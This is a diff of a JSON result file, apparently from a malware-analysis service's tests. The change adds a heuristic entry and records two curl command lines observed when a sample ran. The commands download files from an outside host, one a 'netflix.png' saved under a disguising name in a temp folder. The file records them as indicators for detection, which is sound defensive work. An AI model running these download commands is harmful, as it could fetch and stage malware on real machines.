@@ -65,8 +65,23 @@
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
-        "heuristic": null,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 0,
+          "score_map": {},
+          "signatures": {}
+        },
         "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "curl -s https://file.lucasvl.nl/f/T2VHb19/netflix.png -o C:\\Users\\puncher\\AppData\\Local\\temp\\windows.cache ",
+                "curl -s https://file.lucasvl.nl/f/7Hr9o4w/cookies.cab -o Cookies.cab"
+              ]
+            }
+          },
           "network": {
             "static": {
               "uri": [
@@ -149,6 +164,11 @@
       },
       {
         "attack_ids": [],
+        "heur_id": 5,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
         "heur_id": 10,
         "signatures": [
           "internet_download"
@@ -156,14 +176,26 @@
       }
     ],
     "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "curl -s https://file.lucasvl.nl/f/7Hr9o4w/cookies.cab -o Cookies.cab"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "curl -s https://file.lucasvl.nl/f/T2VHb19/netflix.png -o C:\\Users\\puncher\\AppData\\Local\\temp\\windows.cache "
+        }
+      ],
       "network.static.uri": [
         {
-          "heur_id": null,
+          "heur_id": 5,
           "signatures": [],
           "value": "https://file.lucasvl.nl/f/7Hr9o4w/cookies.cab"
         },
         {
-          "heur_id": null,
+          "heur_id": 5,
           "signatures": [],
           "value": "https://file.lucasvl.nl/f/T2VHb19/netflix.png"
         },
